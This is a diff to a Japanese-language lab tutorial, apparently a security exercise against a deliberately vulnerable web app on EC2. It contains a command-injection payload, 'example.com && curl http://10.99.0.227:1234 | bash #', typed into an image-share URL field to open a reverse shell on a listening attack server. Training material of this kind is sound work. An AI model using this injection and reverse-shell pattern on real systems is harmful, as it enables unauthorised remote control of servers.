@@ -24,13 +24,14 @@ EC2 のローカル環境を攻撃サーバーに見立て、リバースシェ�
 [attack-server]: ./curlshell.py --listen-port 1234
 ```
 
-宛先IPアドレスにはEC2のプライベートIPアドレスを入力してください。
+Web UI 上で、「Share Image」タブのURL入力欄に以下を入力して投稿します。IPアドレスにはEC2のプライベートIPアドレスを入力してください。
 
 ```bash
 example.com && curl http://10.99.0.227:1234 | bash #
 ```
 
-URLに上記を入力して投稿します。<br/>
+![unguard-attack](./images/unguard-attack.png)
+
 画面上は処理がフリーズして見えますが、攻撃サーバーでシェルを取ることに成功しています。
 
 ```bash
